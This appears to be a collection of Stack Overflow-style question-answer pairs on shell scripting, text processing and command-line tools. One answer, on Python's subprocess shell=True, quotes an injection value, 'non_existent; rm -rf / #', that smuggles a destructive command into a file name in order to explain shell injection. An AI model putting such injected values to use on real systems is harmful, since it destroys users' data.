    "How can I run complicated commands on establishing a mosh connection?": "Well, it seems that I have to explicitly use a shell to execute command:\nmosh REMOTE -- sh -c 'tmux a || tmux'\nEDIT\nInstead of doing tmux a || tmux, a better way is add new-session to ~/.tmux.conf and just run tmux. That would make things much easier. I can do things like this now:\nmosh REMOTE -- tmux\nAwesome!",
    "How to print #!/bin/bash using echo command [duplicate]": "! is magic in a default interactive bash session, but not in scripts (set +H to disable in an interactive prompt). In any case:\necho '#!/bin/bash'",
    "how many ways we can create a process in linux using c": "exec family of system call does not call fork, neither it creates a new process. It only overwrites the existing process with the new binary.\nIn linux user programs, fork is the only function to create new process. Though fork internally calls clone and other system calls.\nIn other hands, system is only a wrapper to fork and exec. The actual task of creating a process is done by fork in system. So system is not a way to create new process.",
    "How to insert string or newline before a pattern \"Using SED\" ( Without replacing the pattern) In MAC OS": "With sed:\n$ echo \"aaaabbaaabbaa\" | sed -r 's/([b]+)/\\n\\1/g'\naaaa\nbbaaa\nbbaa\nsed -r allows to catch blocks with () and print them back with \\1. The block it catches it [b]+, meaning \"one or more b's\", and prints it back preceded by a new line.\nAs I see you are using sed -i, it is also good to do:\nsed -i.bak -r 's/([b]+)/\\n\\1/g' input.txt\nAlso, easier (thanks Glenn Jackman!)\n$ echo \"aaaabbaaabbaa\" | sed 's/b\\+/\\n&/g'\naaaa\nbbaaa\nbbaa\nIt replaces all sequences of \"b\" and replaces that with a newline followed by that same sequence of \"b\" (& represents whatever was matched on the left side of s///).",
    "How to wait on all child (and grandchild etc) process spawned by a script": "You can use wait to wait for all the background processes started by userscript to complete. Since wait only works on children of the current shell, you'll need to source their script instead of running it as a separate process.\n( source userscript; wait )\nSourcing the script in an explicit subshell should simulate starting a new process closely enough. If not, you can also background the subshell, which forces a new process to be started, then wait for it to complete.\n( source userscript; wait ) & wait",
    "How to do it correctly: grep -ri '->'": "Another way of doing it is to use -- - this tells grep that you have finished using flags, and any - appearing after this is to be interpreted literally.\n$ echo \"->\" | grep -- \"->\"\n->",
    "Command for finding process using too much CPU [closed]": "Or using a few other utils you could do:\nps aux | sort -rk 3,3 | head -n 5\nChange the value of head to get the number of processes you want to see.",
    "How do I find the exact CLI command given to Python?": "The information you're looking for (command params including quotes) is not available.\nThe shell (bash), not python, reads and interprets quotes--by the time python or any other spawned program sees the parameters, the quotes are removed. (Except for quoted quotes, of course.)\nMore detail\nWhen you type a command into the shell, you use quotes to tell the shell which tokens on your command line to treat as a single parameter. Whitespace is used to break up your command line into individual params, and quotes are used to override that--to include whitespace within a parameter instead of to separate parameters.\nThe shell then forks the executable and passes to it your list of parameters. Any unquoted quotes have already been \"used up\" by the shell in its parsing of your command line, so they effectively no longer exist at this stage, and your command (python) doesn't see them.\nBy the way, I have to wonder why you care about getting the quotes. I have to say that at first glance it seems misguided. Perhaps we can help if you tell us why you feel you need them?\nEDIT\nIn respose to OP's comment below, here's a way to output the original command line--or at least one that's functionally equivalent:\nimport pipes # or shlex if python3\nprint sys.argv[0], ' '.join( [pipes.quote(s) for s in sys.argv[1:]] )\nIt just adds quotes around all params.",
    "perform an operation for *each* item listed by grep": "If I understand your specification, you want:\ngrep --null -l '<pattern>' directory/*.extension1 | \\\n    xargs -n 1 -0 -I{} bash -c 'rm \"$1\" \"${1%.*}.extension2\"' -- {}\nThis is essentially the same as what @triplee's comment describes, except that it's newline-safe.\nWhat's going on here?\ngrep with --null will return output delimited with nulls instead of newline. Since file names can have newlines in them delimiting with newline makes it impossible to parse the output of grep safely, but null is not a valid character in a file name and thus makes a nice delimiter.\nxargs will take a stream of newline-delimited items and execute a given command, passing as many of those items (one as each parameter) to a given command (or to echo if no command is given). Thus if you said:\nprintf 'one\\ntwo three \\nfour\\n' | xargs echo\nxargs would execute echo one 'two three' four. This is not safe for file names because, again, file names might contain embedded newlines.\nThe -0 switch to xargs changes it from looking for a newline delimiter to a null delimiter. This makes it match the output we got from grep --null and makes it safe for processing a list of file names.\nNormally xargs simply appends the input to the end of a command. The -I switch to xargs changes this to substitution the specified replacement string with the input. To get the idea try this experiment:\nprintf 'one\\ntwo three \\nfour\\n' | xargs -I{} echo foo {} bar\nAnd note the difference from the earlier printf | xargs command.\nIn the case of my solution the command I execute is bash, to which I pass -c. The -c switch causes bash to execute the commands in the following argument (and then terminate) instead of starting an interactive shell. The next block 'rm \"$1\" \"${1%.*}.extension2\"' is the first argument to -c and is the script which will be executed by bash. Any arguments following the script argument to -c are assigned as the arguments to the script. This, if I were to say:\nbash -c 'echo $0' \"Hello, world\"\nThen Hello, world would be assigned to $0 (the first argument to the script) and inside the script I could echo it back.\nSince $0 is normally reserved for the script name I pass a dummy value (in this case --) as the first argument and, then, in place of the second argument I write {}, which is the replacement string I specified for xargs. This will be replaced by xargs with each file name parsed from grep's output before bash is executed.\nThe mini shell script might look complicated but it's rather trivial. First, the entire script is single-quoted to prevent the calling shell from interpreting it. Inside the script I invoke rm and pass it two file names to remove: the $1 argument, which was the file name passed when the replacement string was substituted above, and ${1%.*}.extension2. This latter is a parameter substitution on the $1 variable. The important part is %.* which says\n% \"Match from the end of the variable and remove the shortest string matching the pattern.\n.* The pattern is a single period followed by anything.\nThis effectively strips the extension, if any, from the file name. You can observe the effect yourself:\nfoo='my file.txt'\nbar='this.is.a.file.txt'\nbaz='no extension'\nprintf '%s\\n'\"${foo%.*}\" \"${bar%.*}\" \"${baz%.*}\"\nSince the extension has been stripped I concatenate the desired alternate extension .extension2 to the stripped file name to obtain the alternate file name.",
    "exec() any command in C": "If you have to call execvp(), then you will need to split up those strings into an executable name and an array of arguments (the first being the \"name\" of the program and the last being a NULL pointer).\nThat means something like:\nchar cmd1[] = \"ls\";  char *args1[] = {\"ls\", \"-l\", NULL};\nchar cmd1[] = \"rm\";  char *args1[] = {\"rm\", \"*.txt\", NULL}; // but see\n                                                            // globbing below.\nchar cmd1[] = \"cat\"; char *args1[] = {\"cat\", \"makefile\", NULL};\nThis is a non-trivial exercise, especially if you want to allow for quoting, globbing, escaping and so forth.\nQuoting means you'll have to be careful with commands like:\nrm \"file with spaces.txt\"\nin that you can't simply break on the spaces - you'll have to interpret items in the command much the same as the shell does. Simplistic breaking on spaces would give you a command with three arguments for that string above, rather than the correct one.\nBy globbing, I mean you'll almost certainly have problems with something like *.txt since it's typically the shell which expands these arguments. Passing that directly to execvp() will result in a single argument of literally *.txt rather than many arguments matching all the text files in your current directory.\nQuoting means that you'll have to handle things like:\nls -l \"file with spaces and \\\" quote in it\"\nwhich will further complicate your parser.\nDon't get me wrong, it can be done, but it's probably a damn sight easier just using system().\nIf you're still thinking of going the execvp() route, you'll have to:\nsplit the string into separate tokens (rather hard, since you have to handle quotes and escapes).\nglob all the arguments, meaning that those with wildcards in them (and only ones that aren't escaped or protected by virtue of being inside quotes) are expanded into multiple arguments.\nconstruct the argument array, with the command at the front and a NULL at the end.\ncall execvp() with the parameters being first element in that array and the address of the array.",
    "Addressing sys.excepthook error in bash script": "I was seeing this error when piping output from a Python 2.6.2 script into the head command in bash on Ubuntu 9.04. I added try blocks to close stdout and stderr before exiting the script:\ntry:\n    sys.stdout.close()\nexcept:\n    pass\ntry:\n    sys.stderr.close()\nexcept:\n    pass\nI am no longer seeing the error.",
    "How to compare in shell script?": "With numbers, use -eq, -ne, ... for equals, not equals, ...\nx=1\nif [ $x -eq 1 ]\nthen \n  echo \"ok\" \nelse \n  echo \"no\" \nfi\nAnd for others, use == not =.",
    "svn script to commit a set of deleted files": " for i in  $(svn st | grep \\! | awk '{print $2}'); do svn delete $i; done",
    "Alternative to scp, transferring files between linux machines by opening parallel connections": "You could try using split(1) to break the file apart and then scp the pieces in parallel. The file could then be combined into a single file on the destination machine with 'cat'.\n# on local host\nsplit -b 1M large.file large.file. # split into 1MiB chunks\nfor f in large.file.*; do scp $f remote_host: & done\n\n# on remote host\ncat large.file.* > large.file",
    "How do I check if certain files exist in Bash?": "How about\nif [[ ! ( -f $FILE1 && -f $FILE2 ) ]]; then\n    echo NOT FOUND\n    exit 1\nfi\n\n# do stuff\necho OK\nSee help [[ and help test for the options usable with the [[ style tests. Also read this faq entry.\nYour version does not work because (...) spawns a new sub-shell, in which the exit is executed. It therefor only affects that subshell, but not the executing script.\nThe following works instead, executing the commands between {...} in the current shell.\nI should also note that you have to quote both variables to ensure there is no unwanted expansion or word splitting made (they have to be passed as one argument to [).\n[ -f \"$FILE1\" ] && [ -f \"$FILE2\" ] || { echo \"NOT FOUND\"; exit 1; }",
    "WScript.Shell and blocking execution?": "Turns out, that while loop is severe CPU hog :P\nI found a better way:\nZipCommand = \"7za.exe a -r -y \" & ZipDest & BuildLabel & \".zip \" & buildSourceDir\n\nSet wshShell = WScript.CreateObject(\"Wscript.Shell\")\n\nwshShell.Run ZipCommand,1,1\nThe last two arguments are Show window and Block Execution :)",
    "Show current branch on prompt on zsh shell": "I am assuming you want to display something like this [username@computername directory](branch)\nThe code below should do it for Zsh which is a little more involved than accomplishing the same task in bash. There are multiple solutions to this, and you can find more information here if you are interested.\nAdd the following to your .zshrc or .zsh_profile\n# Load version control information\nautoload -Uz vcs_info\nprecmd() { vcs_info }\n\n# Format the vcs_info_msg_0_ variable\nzstyle ':vcs_info:git:*' formats '%b'\n\n# Set up the prompt (with git branch name)\nsetopt PROMPT_SUBST\n\nPROMPT='[%n@%m %1~]%F{green}(${vcs_info_msg_0_})%F{white}$ '\nIt would be beneficial to read up on the differences between bash and zsh as you cannot use solutions found online interchangeably.",
    "Can I use grep to extract a single column of a CSV file?": "Right Tools For The Job: Using awk or cut\nAssuming you want to match the third column against a specific field:\nawk -F';' '$3 ~ /Foo/ { print $0 }' file.txt\n...will print any line where the third field contains Foo. (Changing print $0 to print $3 would print only that third field).\nIf you just want to print the third column regardless, use cut: cut -d';' -f3 <file.txt\nWrong Tool For The Job: Using GNU grep\nOn a system where grep has the -o option, you can chain two instances together -- one to trim everything after the fourth column (and remove lines with less than four columns), another to take only the last remaining column (thus, the fourth):\nstr='foo;bar;baz;qux;meh;whatever'\ngrep -Eo '^[^;]*[;][^;]*[;][^;]*[;][^;]*' <<<\"$str\" \\\n  | grep -Eo '[^;]+$'\nTo explain how that works:\n^, outside of square brackets, matches only at the beginning of a line.\n[^;]* matches any character except ; zero-or-more times.\n[;] matches only the character ;.\n...thus, each [^;]*[;] in the regex matches a single field, whether or not that field contains text. Putting four of those in the first stage means we're matching only fields, and grep -o tells grep to only emit content it was successfully able to match.",
    "Makefile error exit with a message": "You can use exit. the ( and ) can enclose more than one command:\ncmp --silent tmp/test.txt tmp/test_de.txt || (echo \"DecryptFile is different from original\"; exit 1)",
    "exclamation mark to test variable is true or not in bash shell": "tl;dr\n[ ! $bar ] treats $bar as a string, and any nonempty string is considered \"true\" - including literal false; in other words: [ ! 'true' ] && [ ! 'false' ] both evaluate to \"false\", because the operands are nonempty strings in both cases and ! negates the outcome.\nTherefore, you must use string comparison:\nbar=false\nif [ ! \"$bar\" = 'true' ]; then  # same as: [ \"$bar\" != 'true' ]\n    echo 'bar is false'\nelse\n    echo 'bar is true'\nfi\nIn Bash, you can also use [[ ! $bar == 'true' ]] or [[ $bar != 'true' ]]; unless you need to remain POSIX-compliant, I suggest using [[ ... ]].\nIn the context of [ ... ] and [[ ... ]] (Bash-specific), variable values are strings by default, and, generally, POSIX-like shells have no explicit Boolean data type.\nUnary operator ! interprets its operand implicitly as a Boolean, and a string in a Boolean context is interpreted as follows:\nonly an empty string is considered \"false\" (exit code 1(!))\nany nonempty string - including literal false - is considered \"true\" (exit code 0(!))\nThus, ! $bar evaluates to \"false\", because $bar - containing nonempty string 'false' - evaluates to \"true\", and ! inverts that.\n! can also be used outside of conditionals to directly negate the success status of commands (including [).\nSince false and true also exist as command names (typically, as shell builtins), you could do the following, but do note that it only works as intended with variable values that are either the literals false or true:\nbar=false\nif ! \"$bar\"; then\n   echo 'bar is false'\nelse\n   echo 'bar is true'\nfi\nBackground information\nPOSIX-like shells only have 2 basic (scalar) data types:\nstrings (by default):\nIn [ ... ] and [[ ... ]] conditionals, operators = (== in Bash), <, <=, >, >= perform string comparison.\nintegers:\nIn [ ... ] and [[ ... ]] conditionals, distinct arithmetic operators (-eq, lt, le, gt, ge) must be used to perform numerical comparison\nAlternatively, in an arithmetic expansion ($(( ... ))), ==, <, <=, >, >= have their usual, numeric meaning.\nIn Bash, you can also use (( ... )) as an arithmetic conditional.\nNote: Per POSIX, you cannot type a variable as an integer (because there is no way to declare a shell variable), so it is only implicitly treated as one in comparisons using arithmetic operators / in arithmetic contexts.\nIn Bash, however, you can declare integer variables with declare -i / local -i, but in conditionals / arithmetic contexts it is still the choice of operator / arithmetic context that determines whether the value is treated as a string or as an integer.\nBooleans in shells are expressed implicitly as exit codes, in a reversal of the usual Boolean-to-integer mapping:\n\"true\" maps to exit code 0(!)\n\"false\" is expressed as exit code 1(!) or any other nonzero exit code.",
    "Why do scripts define common commands in variables?": "Using the full pathname ensures that the script operates correctly even if it's run by a user who customizes their PATH environment variable so that it finds different versions of these commands than the script expects.\nUsing variables simplifies writing the script, so you don't have to write the full pathname of a command each time it appears in the script.",
    "Need to concatenate a string to each line of ls command output in unix": "You can't use ls alone to append data before each file. ls exists to list files.\nYou will need to use other tools along side ls.\nYou can append to the front of each line using the sed command:\ncat FLIST.TXT | sed 's/^/STR,/'\nThis will send the changes to stdout.\nIf you'd like to change the actual file, run sed in place:\nsed -i -e 's/^/STR,/' FLIST.TXT  \nTo do the append before writing to the file, pipe ls into sed:\nls FILE* | sed 's/^/STR,/' > FLIST.TXT",
    "AppleScript : error \"sh: lame: command not found\" number 127": "To complement Paul R's helpful answer:\nThe thing to note is that do shell script - regrettably - does NOT see the same $PATH as shells created by Terminal.app - a notable absence is /usr/local/bin.\nOn my OS X 10.9.3 system, running do shell script \"echo $PATH\" yields merely:\n/usr/bin:/bin:/usr/sbin:/sbin\nThere are various ways around this:\nUse the full path to executables, as in Paul's solution.\nManually prepend/append /usr/local/bin, where many non-system executables live, to the $PATH - worth considering if you invoke multiple executables in a single do shell script command; e.g.:\ndo shell script \"export PATH=\\\"/usr/local/bin:$PATH\\\"\n cd ~/Downloads\n say -f ~/Downloads/RE.txt -o ~/Downloads/recording.aiff\n lame -m m ~/Downloads/recording.aiff ~/Downloads/recording.mp3\n rm recording.aiff RE.txt\"\nNote how the above use a single do shell script command with multiple commands in a single string - commands can be separated by newlines or, if on the same line, with ;.\nThis is more efficient than multiple invocations, though adding error handling both inside the script code and around the do shell script command is advisable.\nTo get the same $PATH that interactive shells see (except additions made in your bash profile), you can invoke eval $(/usr/libexec/path_helper -s); as the first statement in your command string.\nOther important considerations with do shell script:\nbash is invoked as sh, which results in changes in behavior, most notably:\nprocess substitution (<(...)) is not available\necho by default accepts no options and interprets escape sequences such as \\n.\nother, subtle changes in behavior; see http://www.gnu.org/software/bash/manual/html_node/Bash-POSIX-Mode.html\nYou could address these issues manually by prepending shopt -uo posix; shopt -u xpg_echo; to your command string.\nThe locale is set to the generic \"C\" locale instead of to your system's; to fix that, manually prepend export LANG='\" & user locale of (system info) & \".UTF-8' to your command string.\nNo startup files (profiles) are read; this is not surprising, because the shell created is a noninteractive (non-login) shell, but sometimes it's handy to load one's profile by manually by prepending . ~/.bash_profile to the command string; note, however, that this makes your AppleScript less portable.\ndo shell script command reference: http://developer.apple.com/library/mac/#technotes/tn2065/_index.html",
    "What DISPLAY settings needed for running .sh installer for Java 7 EE SDK on Mac OSX": "It says it needs the DISPLAY variable set - what do I need to set it to?\nInstead of saying:\n./java_ee_sdk-7-jdk7-macosx-x64-ml.sh\nsay:\nDISPLAY=:0 ./java_ee_sdk-7-jdk7-macosx-x64-ml.sh\nAlternatively, you could get the tarball installer instead and extract it to the desired location.",
    "tee to a compressed file": "If your shell is bash (version 4.x), you have 'process substitution', and you could use:\nsome_command 2>&1 | tee >(bzip2 -c > log.bz2)\nThis redirects standard error and standard output to tee (like |& does, but I prefer the classic notation). The copy of tee's output is sent to a process instead of a file; the process is bzip2 -c > log.bz2 which writes its standard input in compressed format to its standard output. The other (uncompressed) copy of the output goes direct to standard output, of course.",
    "Get rid of newline from shell commands in Ruby": "Use either String#strip to remove all wrapping whitespace, or String#chomp (note the 'm') to remove a single trailing newline only.\nString#chop removes the last character (or \\r\\n pair) which could be dangerous if the command does not always end with a newline.\nI assume that your code did not work because the results had multiple newlines\\whitespace at the end of the output. (And if so, strip will work for you.) You can verify this, however, by removing the call to chop, and then using p u or puts u.inspect to see what characters are actually in the output.\nAnd for your information, it's idiomatic in Ruby to omit parentheses when calling methods that take no arguments, e.g. u = foo.chop.",
    "How can I know which shell I am using?": "Yet another way: echo $SHELL.",
    "Bash configuration on Mac OS X 10.4+": "It's expected behaviour. See here\nWhen bash is invoked as an interactive login shell, or as a non-interactive shell with the --login option, it first reads and executes commands from the file /etc/profile, if that file exists. After reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile, in that order, and reads and executes commands from the first one that exists and is readable.\nSo only the first readable one counts.\nAs for which you should use, it's up to you - unless there are corporate policies or something else that creates a specific one, or relies on a specific one existing.",
    "How to create scripts in zsh that can accept out of order arguments?": "Traditionally shell built-in command getopts is used for handling script parameters. From your example it seems that you need support for long options (this is short option: -s and this is long option --long), but most shells, including zsh doesn't support long options in their implementation of getopts. If it is absolutely necessary to use POSIX compatible tool, various implementations of this, like getopts_long, already exists.\nMost of the time another tool is availabe - GNU getopt. This one support both options and is available on most Linux distributions by default. You can find exhaustive example with description in man pages getopt(1).\nzsh variant - zparseopts\nzsh have another option called zparseopts. You can find description and more examples in documentation for zshmodules(1). Finally, here is the code snippet for your case:\n#!/bin/zsh\n\nzparseopts -E -D -- \\\n           -include:=o_include \\\n           -exclude-file-ext:=o_exclude \\\n           -show-only=o_show\n\necho \"include: ${o_include[2]}\"\necho \"exclude: ${o_exclude[2]}\"\necho \"show? ${o_show}\"",
    "Delete if exists not working from ansible playbook": "Use the file module to delete the directory, instead of shell:\n- name: Delete existing dist folder\n  file:\n    path: \"{{ base_path }}/dist\"\n    state: absent\nAccording to the documentation, it is very close to rm -rf:\nIf absent, directories will be recursively deleted, and files or symlinks will be unlinked. Note that absent will not cause file to fail if the path does not exist as the state did not change.",
    "Add month to a variable date in shell script": "You seem to be looking for:\ndate -d \"20170601+1 month\" +%Y-%m-%d\nWhen using multiple -d flags in the same command, date seems to only use the last one.\nAnd of course, feel free to replace 20170601 by $VAR containing any date.",
    "How to detect if a Ruby script is running through a shell pipe?": "Use $stdout.isatty or more idiomatically, $stdout.tty?. I created a little test.rb file to demonstrate, contents:\nputs $stdout.isatty\nResults:\n$ ruby test.rb\ntrue\n\n$ ruby test.rb | cat\nfalse\nReference: https://ruby-doc.org/core/IO.html#method-i-isatty",
    "Do I need to quote command substitutions?": "$(echo foo bar) is indeed a command substitution. In this specific example, you don't need double quotes because a variable assignment creates a \u201cdouble quote context\u201d for its right-hand side, so VAR=$(\u2026) is equivalent to VAR=\"$(\u2026)\".\nIn bash, you don't need double quotes in export VAR=$(\u2026) or declare VAR=$(\u2026). But you do need the double quotes in some other sh implementations such as dash.\nYou do need double quotes in env VAR=$(\u2026) somecommand, in make VAR=$(\u2026), etc. It isn't the equal sign that makes the double quotes optional, it's the fact that the equal sign is parsed by the shell as an assignment.\nThere are a few other contexts where the double quotes are optional, but you can't go wrong with the simple rule: always use double quotes around variable and command substitutions unless you want the split+glob operator.",
    "FFmpeg: convert .mpg video to .mp4 without losing quality": "You're encoding but you're not setting any encoding parameters. Read this guide and then choose the appropriate parameters for your use case, e.g.:\nffmpeg -i $in -c:v libx264 -c:a libfaac -crf 20 -preset:v veryslow $out\nDo not use -r. If you want better quality, use a lower -crf value. If you want smaller files, use a higher -crf value. If you care more about bitrate than quality targets, see the appropriate section in the aforementioned guide.",
    "Upload to S3 via shell script without aws-cli, possible?": "",
    "When to use Shell=True for Python subprocess module [duplicate]": "If shell is True, the specified command will be executed through the shell. This can be useful if you are using Python primarily for the enhanced control flow it offers over most system shells and still want convenient access to other shell features such as shell pipes, filename wildcards, environment variable expansion, and expansion of ~ to a user\u2019s home directory.\nWhen shell=True is dangerous?\nIf we execute shell commands that might include unsanitized input from an untrusted source, it will make a program vulnerable to shell injection, a serious security flaw which can result in arbitrary command execution. For this reason, the use of shell=True is strongly discouraged in cases where the command string is constructed from external input\nEg. (Taken from docs)\n>>> from subprocess import call\n>>> filename = input(\"What file would you like to display?\\n\")\nWhat file would you like to display?\nnon_existent; rm -rf / #\n>>> call(\"cat \" + filename, shell=True) # Uh-oh. This will end badly..",
    "Export every revision of a single file from a Git repository?": "To export all revisions of a file to a given folder, you can use this loop in Bash:\nfor sha in `git rev-list HEAD -- path/to/file`; do\n    git show ${sha}:path/to/file > path/to/exportfolder/${sha}_doc.ai\ndone\nYou can customize this, of course.\nCopy the snippet into a text file, and replace path/to/file with the actual path to the file you want to export (inside the repo). Replace path/to/exportfolder with the actual path to where you want to export the files to (the export folder must exist). You can also modify the exported filename, in this version it uses the format \"_doc.ai\"; just make sure to use quotes if you want to use a file or path name with spaces.\nThis version will start at the currently checked out revision (HEAD) and walk over the history to all revisions reachable from HEAD in the ancestry tree. That means you should check out the most recent revision you want to start exporting from.",
    "How can I use an at command in a shell script?": "I'd say\nat now +10 minutes <<< \"rm -rf /tmp/tobedeleted\"\nFor multiline, consider a \"HERE-doc\"\nat now +10 minutes <<ENDMARKER\nrm -rf /tmp/tobedeleted\necho all done | mail -s 'completion notification' sysadmin@example.com\nENDMARKER",
    "How to run a c program in bash script and give it 2 arguments?": "Right now you're not actually passing any arguments to the program in your script.\nJust pass the arguments normally:\n./app \"$file\" \"$text\"\nI put the arguments in double-quotes to make the shell see the variables as single arguments, in case they contain spaces.",
    "Bash (grep) regex performing unexpectedly": "The syntax you used (\\d) is not recognised by Bash's Extended regex.\nUse grep -P instead which uses Perl regex (PCRE). For example:\ngrep -P \"\\d+/\\d+/\\d+\" input.txt\ngrep -P \"\\d{2}/\\d{2}/\\d{4}\" input.txt  # more restrictive\nOr, to stick with extended regex, use [0-9] in place of \\d:\ngrep -E \"[0-9]+/[0-9]+/[0-9]\" input.txt\ngrep -E \"[0-9]{2}/[0-9]{2}/[0-9]{4}\" input.txt  # more restrictive",
    "npm install failing": "I have the same error if not privileged, so I must use sudo when using the -g flag\nIf sudo don't recongize npm you can try:\npassing the complete route of npm\n$ sudo $(which npm) install -g socket.io\npreserving the environment with -E flag\n$ sudo -E npm install -g socket.io\nUpd:\nNote that is recommended to use the -g flag only for executables and install locally (without the flag) the libraries that are required in your code. Privileges are required for copying the executables to /usr/bin or, in your case /usr/local/bin\nNote too that in the socket.io site, the -g flag is not included for the installation command ;)\nRead more: http://blog.nodejs.org/2011/03/23/npm-1-0-global-vs-local-installation/",
    "R, passing variables to a system command": "",
    "Return two variables in awk": "It's not pretty, but if you really need to do this in one line you can use awk/bash's advanced meta-programming capabilities :)\neval $(ls -la | awk '{usr = $3 \" \" usr;fil = $9 \" \" fil} END{print \"usr=\\\"\"usr\"\\\";fil=\\\"\"fil\"\\\"\"}')\nTo print:\necho -e $usr\necho -e $fil\nPersonally, I'd stick with what you have - it's much more readable and performance overhead is tiny compared to the above:\n$time <three line approach>\n\nreal    0m0.017s\nuser    0m0.006s\nsys     0m0.011s\n\n$time <one line approach>\nreal    0m0.009s\nuser    0m0.004s\nsys     0m0.007s",
    "Git sh.exe process forking issue on windows XP, slow?": "Usually when a program takes 30 seconds to do something that should be instantaneous, it's more likely to be an I/O timeout problem, usually network, rather than the speed of your CPU or the amount of RAM you have. You may wonder how the network is involved, but that's a legitimate question (I wouldn't know for your system either).\nMsysgit installs a special prompt that runs a special function __git_ps1 that shows some useful information in the prompt. You can see this using echo $PS1, for my system this shows:\n$ echo $PS1\n\\[\\033]0;$MSYSTEM:\\w\\007 \\033[32m\\]\\u@\\h \\[\\033[33m\\w$(__git_ps1)\\033[0m\\] $\nThis extra information is totally optional and you can turn it off. So try the following in an Msysgit window:\n$ PS1='$ '\n$\nThis will reset the prompt to the default $ and not try to run and commands inside the prompt. If this solves your delay problem, then it's likely to be the __git_ps1 function. Try running it manually:\n$ __git_ps1\n (master)\nand see how long it takes to return.\nYou can fix this by removing the line that invokes __git_ps1 from C:\\Program Files\\Git\\etc\\profile:\n#Comment the lines below\n#PS1='\\[\\033]0;$MSYSTEM:\\w\\007\n#\\033[32m\\]\\u@\\h \\[\\033[33m\\w$(__git_ps1)\\033[0m\\]\n#$ '",
    "Prepend text in file": "The short answer is that you can't. You'll need a temp file.\necho \"Prepended Line\" > tmpfile && cat origfile >> tmpfile && mv tmpfile origfile\nEdit:\nsed -i 's/\\(line you want\\)/Prefix \\1/g' origfile",
    "killproc and pidofproc on linux": "killproc is in redhat enterprise linux 5.4 as part of /etc/init.d/functions\nif you need it just do\n. /etc/init.d/functions\nin your script to load the shell functions, its probably in other versions of redhat but thats the only one i have to hand at the moment",
    "gzip: stdout: File too large when running customized backup script": "File too large is a error message from your libc: The output has exceeded the file size limit of your filesystem.\nSo this is not a gzip issue.\nOptions: Use another Filesystem or use split:\ntar czf - www|split -b 1073741824 - www-backup.tar.\ncreates the backup.\nRestore it from multiple parts:\ncat www-backup.tar.*|gunzip -c |tar xvf -",
    "Delete duplicate commands of zsh_history keeping last occurence": "The zsh option hist_ignore_all_dups should do what you want. Just add setopt hist_ignore_all_dups to your zshrc.\nIf you really want to remove the duplicates manually (or do more interesting things with them), here's a one-liner that produces the same results as zsh itself: only the last occurrence of a command is kept and all entries remain in the same order, regardless of the timestamp.\nsed ':start; /\\\\$/ { N; s/\\\\\\n/\\\\\\x00/; b start }' .zsh_history | nl -nrz | tac | sort -t';' -u -k2 | sort | cut -d$'\\t' -f2- | tr '\\000' '\\n' > .zsh_history_deduped\nThe main improvement over the other answers is proper handling of commands with multiple lines. These are stored in the history file with backslashes before the newlines, so I use sed to join the lines with null bytes and tr to restore them after deduplicating. zsh has its own internal escaping for null bytes and other special characters, so they won't occur in the file (for the curious, it uses 0x83 as an escape marker and XORs the following byte with 0x20).\nFinally, some notes about what the individual commands do:\nsed ':start; /\\\\$/ { N; s/\\\\\\n/\\\\\\x00/; b start }' .zsh_history  # join multiline commands\n| nl -nrz                  # add line numbers so we can restore the original order\n| tac | sort -t';' -u -k2  # sort and remove duplicate commands, keeping the last occurrence\n| sort                     # sort on line numbers\n| cut -d$'\\t' -f2-         # remove the line numbers\n| tr '\\000' '\\n'           # restore multiline commands\n> .zsh_history_deduped",
    "Get all but first N arguments to a bash function": "Just shift off the front ones as you're done with them; what's left will be in \"$@\".\nThis has the advantage of being compatible with all POSIX shells (the only extension used in the below is local, and it's a widespread one, even available in dash).\ncustom_scp() {\n  local user port  # avoid polluting namespace outside your function\n  port=$1; shift   # assign to a local variable, then pop off the argument list\n  user=$1; shift   # repeat\n  scp -P \"$port\" -r \"$@\" \"${user}@myserver.com:~/\"\n}",
    "What is '$' in python? [duplicate]": "It means you need to type everything but the $ in the terminal.\npython test1.py\nIt's just a convention though. Authors also use > python test1.py and other notations.\nI don't know which version of his book you're reading, but he mentions it in this version.\nIn the example that follows, $ is a sample system prompt for you to type a command like python in the terminal window. We\u2019ll use it for the code examples in this book, although your prompt might be different.",
    "\"Too many open files\" when executing gatling on Mac": "Just in case any one else lands here from google, here are the steps required to change the open files limit on the latest versions of OS X:\n1. In /Library/LaunchDaemons create a file named limit.maxfiles.plist and paste the following in (feel free to change the two numbers (which are the soft and hard limits, respectively):\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"  \n        \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">  \n  <dict>\n    <key>Label</key>\n    <string>limit.maxfiles</string>\n    <key>ProgramArguments</key>\n    <array>\n      <string>launchctl</string>\n      <string>limit</string>\n      <string>maxfiles</string>\n      <string>64000</string>\n      <string>524288</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>ServiceIPC</key>\n    <false/>\n  </dict>\n</plist> \n2. Change the owner of your new file:\nsudo chown root:wheel /Library/LaunchDaemons/limit.maxfiles.plist\n3. Check current settings launchctl limit maxfiles\n4. Load these new settings:\nsudo launchctl load -w /Library/LaunchDaemons/limit.maxfiles.plist\n5. Finally, check that the limits are correct:\nlaunchctl limit maxfiles",
    "Why is a shell script giving syntax errors when the same code works elsewhere? [duplicate]": "TL;DR: Your script has Windows style CRLF line endings, aka \\r\\n.\nConvert to Unix style \\n by deleting the carriage returns.\nHow do I check if my script has carriage returns?\nThey're detectable as ^M in the output of cat -v yourscript:\n$ cat -v myscript\nif true^M\nthen^M\n  true^M\n...\nHow do I remove them?\nSet your editor to save the file with Unix line endings, aka \"line terminators\" or \"end-of-line characters\", and resave it.\nYou can also remove them from a command line with dos2unix yourscript or cat yourscript | tr -d '\\r' > fixedscript.\nWhy do carriage returns cause syntax errors?\nThe carriage return character is just another character to bash. then is not the same as then\\r, so bash doesn't recognize it as a keyword and assumes it's a command. It then keeps looking for a then and fails\nIf there happens to be a trailing space after then, you get a similar problem for fi.",
    "why second time cp command is faster": "This is because of page caching. Run sync ; echo 3 > /proc/sys/vm/drop_caches to make it slow again.\nFurther reading:\nhttp://jim.studt.net/depository/index.php/flushing-caches-for-benchmarking-in-linux\nhttps://superuser.com/a/319287/236874",
